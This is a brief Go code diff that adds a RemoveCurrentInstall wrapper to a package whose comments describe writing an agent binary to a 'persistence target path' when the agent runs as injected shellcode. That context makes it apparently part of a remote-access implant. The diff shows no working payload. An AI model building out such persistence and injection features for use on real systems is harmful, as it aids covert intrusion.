@@ -42,6 +42,10 @@ func Remove() error {
 	return uninstall()
 }
 
+func RemoveCurrentInstall(currentExe string) error {
+	return removeCurrentInstall(currentExe)
+}
+
 // SetupFromBytes writes data to the platform persistence target path and
 // registers it — used when the agent is running as injected shellcode and
 // selfDropBinary contains the normal (non-shellcode) agent PE/ELF.
